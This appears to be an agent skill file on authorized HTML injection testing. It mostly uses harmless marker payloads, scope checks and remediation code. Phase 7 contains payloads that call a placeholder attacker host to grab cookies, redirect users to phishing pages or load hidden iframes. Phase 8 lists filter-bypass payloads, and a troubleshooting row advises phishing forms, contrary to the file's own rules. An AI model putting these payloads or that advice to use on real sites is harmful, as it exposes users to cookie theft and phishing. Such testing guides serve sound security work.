---
name: web-html-injection-testing
description: 'Use this skill for authorized HTML injection assessment, triage, safe reproduction, remediation guidance, and defensive validation of content injection vulnerabilities in owned systems, approved engagements, or local labs.'
---

# HTML Injection Assessment

## Purpose

Assess HTML injection risk in authorized environments, reproduce findings with harmless proof markers, document impact safely, and guide remediation with context-aware output encoding and safer rendering patterns.

## Authorization and Safety Rules

- Test only systems the user owns, systems covered by a written authorization, or local lab targets.
- Confirm the target scope before testing, including allowed hosts, paths, accounts, and time windows.
- Use harmless proof markers such as `HTML_INJECTION_TEST`; do not collect credentials, tokens, cookies, or personal data.
- Do not create phishing pages, credential collection forms, persistence, public-target probing, or destructive visual changes.
- Stop and ask for scope clarification when authorization, target ownership, or testing limits are unclear.

## Prerequisites

### Required Tools
- Web browser with developer tools
- Burp Suite or OWASP ZAP
- Tamper Data or similar proxy
- cURL for testing payloads

### Required Knowledge
- HTML fundamentals
- HTTP request/response structure
- Web application input handling
- Difference between HTML injection and XSS

## Outputs and Deliverables

1. **Vulnerability Report** - Identified injection points
2. **Exploitation Proof** - Demonstrated content manipulation
3. **Impact Assessment** - Potential phishing and defacement risks
4. **Remediation Guidance** - Input validation recommendations

## Core Workflow

### Phase 1: Understanding HTML Injection

HTML injection occurs when user input is reflected in web pages without proper sanitization:

```html
<!-- Vulnerable code example -->
<div>
    Welcome, <?php echo $_GET['name']; ?>
</div>

<!-- Test input -->
?name=<strong>HTML_INJECTION_TEST</strong>

<!-- Rendered output -->
<div>
    Welcome, <strong>HTML_INJECTION_TEST</strong>
</div>
```

Key differences from XSS:
- HTML injection: Only HTML tags are rendered
- XSS: JavaScript code is executed
- HTML injection can increase user deception risk even without script execution

Testing goals:
- Identify unsafe HTML rendering
- Confirm affected contexts with harmless markers
- Document user-visible impact safely
- Recommend context-aware remediation

### Phase 2: Identifying Injection Points

Map application for potential injection surfaces:

```
1. Search bars and search results
2. Comment sections
3. User profile fields
4. Contact forms and feedback
5. Registration forms
6. URL parameters reflected on page
7. Error messages
8. Page titles and headers
9. Hidden form fields
10. Cookie values reflected on page
```

Common vulnerable parameters:
```
?name=
?user=
?search=
?query=
?message=
?title=
?content=
?redirect=
?url=
?page=
```

### Phase 3: Basic HTML Injection Testing

Test with harmless proof markers:

```html
<!-- Plain marker -->
HTML_INJECTION_TEST

<!-- Minimal formatting marker -->
<strong>HTML_INJECTION_TEST</strong>
<em>HTML_INJECTION_TEST</em>

<!-- Minimal structural marker -->
<span data-test="html-injection-proof">HTML_INJECTION_TEST</span>
<p>HTML_INJECTION_TEST</p>
```

Testing workflow:
```bash
# Test basic marker reflection
curl "http://target.com/search?q=<strong>HTML_INJECTION_TEST</strong>"

# Check if HTML renders in response
curl -s "http://target.com/search?q=<strong>HTML_INJECTION_TEST</strong>" | grep -i "HTML_INJECTION_TEST"

# Test in URL-encoded form
curl "http://target.com/search?q=%3Cstrong%3EHTML_INJECTION_TEST%3C%2Fstrong%3E"
```

### Phase 4: Types of HTML Injection

#### Stored HTML Injection

Payload persists in database:

```html
<!-- Profile bio marker -->
Name: John Doe
Bio: <strong>HTML_INJECTION_TEST</strong>

<!-- Comment marker -->
Great article!
<span data-test="html-injection-proof">HTML_INJECTION_TEST</span>
```

#### Reflected GET Injection

Payload in URL parameters:

```html
<!-- URL marker -->
http://target.com/welcome?name=<strong>HTML_INJECTION_TEST</strong>

<!-- Search result marker -->
http://target.com/search?q=<span>HTML_INJECTION_TEST</span>
```

#### Reflected POST Injection

Payload in POST data:

```bash
# POST marker test
curl -X POST -d "comment=<strong>HTML_INJECTION_TEST</strong>" \
     http://target.com/submit

# Form field marker
curl -X POST -d "name=<strong>HTML_INJECTION_TEST</strong>&email=test@test.com" \
     http://target.com/register
```

#### URL-Based Injection

Inject into displayed URLs:

```html
<!-- If URL is displayed on page -->
http://target.com/page/<strong>HTML_INJECTION_TEST</strong>

<!-- Path-based injection -->
http://target.com/users/<span>HTML_INJECTION_TEST</span>/profile
```

### Phase 5: Phishing Risk Analysis

Do not build phishing pages, credential capture forms, hidden data collection, or encoded phishing links. Assess phishing risk through safe evidence and report language:

- Determine whether injected markup can render user-visible content in trusted application areas.
- Confirm whether the vulnerable page includes login, payment, account recovery, or other sensitive workflows nearby.
- Capture screenshots using only `HTML_INJECTION_TEST` markers.
- Document that rendered HTML could mislead users if abused, without constructing credential collection flows.
- Recommend context-aware output encoding, template auto-escaping, and removal of unsafe HTML sinks.

Report language example:

```text
The application renders user-controlled HTML in a trusted page context. A harmless marker, HTML_INJECTION_TEST, was used to confirm rendering. Because this area is user-visible and near sensitive account workflows, an attacker could attempt to mislead users if the issue is not remediated. No credential collection, external callbacks, or phishing pages were created during testing.
```

### Phase 6: Visual Impact Evidence

Do not use full-page overlays, hacked messages, content replacement, page hiding, external images, or disruptive animation. Collect screenshot-safe evidence with visible proof markers:

```html
<strong>HTML_INJECTION_TEST</strong>
<span data-test="html-injection-proof">HTML_INJECTION_TEST</span>
```

Evidence checklist:
- Capture the page URL, affected parameter or field, and timestamp.
- Include before and after screenshots when possible.
- Keep the marker small, readable, and non-destructive.
- Do not obscure application content or interrupt user workflows.
- Document visual impact in words instead of recreating harmful page changes.

### Phase 7: Advanced Injection Techniques

#### CSS Injection

```html
<!-- Style injection -->
<style>
    body { background: url('http://attacker.com/track?cookie='+document.cookie) }
    .content { display: none }
    .fake-content { display: block }
</style>

<!-- Inline style injection -->
<div style="background:url('http://attacker.com/log')">Content</div>
```

#### Meta Tag Injection

```html
<!-- Redirect via meta refresh -->
<meta http-equiv="refresh" content="0;url=http://attacker.com/phish">

<!-- CSP bypass attempt -->
<meta http-equiv="Content-Security-Policy" content="default-src *">
```

#### Form Action Override

Do not override form actions, add fields to existing forms, or direct form submissions to external endpoints. If form-adjacent rendering is confirmed, document the affected form name, page, and surrounding workflow with a harmless `HTML_INJECTION_TEST` marker.

#### iframe Injection

```html
<!-- Embed external content -->
<iframe src="http://attacker.com/malicious" width="100%" height="500"></iframe>

<!-- Invisible tracking iframe -->
<iframe src="http://attacker.com/track" style="display:none"></iframe>
```

### Phase 8: Bypass Techniques

Evade basic filters:

```html
<!-- Case variations -->
<H1>Test</H1>
<ScRiPt>alert(1)</ScRiPt>

<!-- Encoding variations -->
&#60;h1&#62;Encoded&#60;/h1&#62;
%3Ch1%3EURL%20Encoded%3C%2Fh1%3E

<!-- Tag splitting -->
<h
1>Split Tag</h1>

<!-- Null bytes -->
<h1%00>Null Byte</h1>

<!-- Double encoding -->
%253Ch1%253EDouble%2520Encoded%253C%252Fh1%253E

<!-- Unicode encoding -->
\u003ch1\u003eUnicode\u003c/h1\u003e

<!-- Attribute-based -->
<div onmouseover="alert(1)">Hover me</div>
<img src=x onerror=alert(1)>
```

### Phase 9: Automated Testing

Automation must stay inside the approved scope and use only harmless proof markers. Do not collect credentials, cookies, tokens, personal data, or page content beyond the minimum evidence needed to verify marker rendering.

#### Using Burp Suite

```
1. Confirm the target host is in the written scope
2. Capture request with potential injection point
3. Send to Intruder
4. Mark only the approved parameter value as payload position
5. Load a short safe marker list using HTML_INJECTION_TEST only
6. Set a low request rate and timeout
7. Filter responses for marker reflection or rendering
8. Manually verify every finding before reporting
```

#### Using OWASP ZAP

```
1. Configure the in-scope context and exclude all out-of-scope hosts
2. Spider only approved paths
3. Run HTML injection checks with safe marker payloads only
4. Set conservative request throttling and timeouts
5. Review alerts for marker reflection or rendering
6. Validate findings manually before reporting
```

#### Custom Fuzzing Script

```python
#!/usr/bin/env python3
import requests
import time
import urllib.parse
from urllib.parse import urlparse

target = "http://target.com/search"
param = "q"
allowed_hosts = {"target.com"}
request_timeout_seconds = 5
delay_between_requests_seconds = 1

payloads = [
    "HTML_INJECTION_TEST",
    "<strong>HTML_INJECTION_TEST</strong>",
    "<em>HTML_INJECTION_TEST</em>",
    "<span data-test='html-injection-proof'>HTML_INJECTION_TEST</span>",
    "<p>HTML_INJECTION_TEST</p>",
]

parsed_target = urlparse(target)
if parsed_target.hostname not in allowed_hosts:
    raise SystemExit(f"Target host is not in scope: {parsed_target.hostname}")

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"{target}?{param}={encoded}"
    parsed_url = urlparse(url)

    if parsed_url.hostname not in allowed_hosts:
        print(f"[-] Skipping out-of-scope host: {parsed_url.hostname}")
        continue
    
    try:
        response = requests.get(url, timeout=request_timeout_seconds)
        if payload.lower() in response.text.lower():
            print(f"[+] Possible marker rendering; manually verify: {payload}")
        elif "HTML_INJECTION_TEST" in response.text:
            print(f"[?] Marker reflected with possible encoding; manually verify: {payload}")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        time.sleep(delay_between_requests_seconds)
```

### Phase 10: Prevention and Remediation

Secure coding practices:

```php
// PHP: Escape output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP: Strip tags
echo strip_tags($user_input);

// PHP: Allow specific tags only
echo strip_tags($user_input, '<p><b><i>');
```

```python
# Python: HTML escape
from html import escape
safe_output = escape(user_input)

# Python Flask: Auto-escaping
{{ user_input }}  # Jinja2 escapes by default
{{ user_input | safe }}  # Marks as safe (dangerous!)
```

```javascript
// JavaScript: Text content (safe)
element.textContent = userInput;

// JavaScript: innerHTML (dangerous!)
element.innerHTML = userInput;  // Vulnerable!

// JavaScript: Sanitize
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers
- Web Application Firewall (WAF) rules

## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `HTML_INJECTION_TEST` | Plain reflection check |
| `<strong>HTML_INJECTION_TEST</strong>` | Basic rendering check |
| `<em>HTML_INJECTION_TEST</em>` | Simple formatting check |
| `<span data-test="html-injection-proof">HTML_INJECTION_TEST</span>` | Attribute context check |
| `<p>HTML_INJECTION_TEST</p>` | Block rendering check |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<strong>HTML_INJECTION_TEST</strong>` |
| Form field | POST with marker payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file containing only a visible marker |

### Encoding Types

| Type | Example |
|------|---------|
| URL encoding | `%3Cstrong%3EHTML_INJECTION_TEST%3C%2Fstrong%3E` = `<strong>HTML_INJECTION_TEST</strong>` |
| HTML entities | `&#60;strong&#62;HTML_INJECTION_TEST&#60;/strong&#62;` = `<strong>HTML_INJECTION_TEST</strong>` |
| Double encoding | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## Constraints and Limitations

### Attack Limitations
- Modern browsers may sanitize some injections
- CSP can prevent inline styles and scripts
- WAFs may block common payloads
- Some applications escape output properly

### Testing Considerations
- Distinguish between HTML injection and XSS
- Verify visual impact in browser
- Test in multiple browsers
- Check for stored vs reflected

### Severity Assessment
- Lower severity than XSS (no script execution)
- Higher impact when combined with phishing
- Consider defacement/reputation damage
- Evaluate credential theft potential

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |